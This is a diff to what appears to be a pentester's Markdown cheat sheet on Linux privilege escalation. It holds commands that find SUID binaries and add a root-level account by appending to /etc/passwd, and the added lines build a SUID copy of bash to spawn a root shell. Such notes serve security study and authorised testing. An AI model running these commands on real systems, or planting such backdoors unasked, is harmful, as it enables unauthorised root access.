@@ -78,7 +78,7 @@ find / -perm -u=s -type f 2>/dev/null
 ```
 find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null|column -t
 ```
-###### Linux 
+###### Linux PrivEsc Exploitation
 ```
 ./unix-privesc-check // http://pentestmonkey.net/tools/unix-privesc-check
 ---
@@ -98,5 +98,14 @@ echo "<NEW USERNAME>:<HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd // add user
 - 
 su <new username> // rooted ;)
 ```
+Try copy /bin/bash to spawn a root shell
 
+```
+cp /bin/bash rootbash
+
+Make sure it is owned by root user and has the SUID bit set
+
+./rootbash -p 
+
+```
 
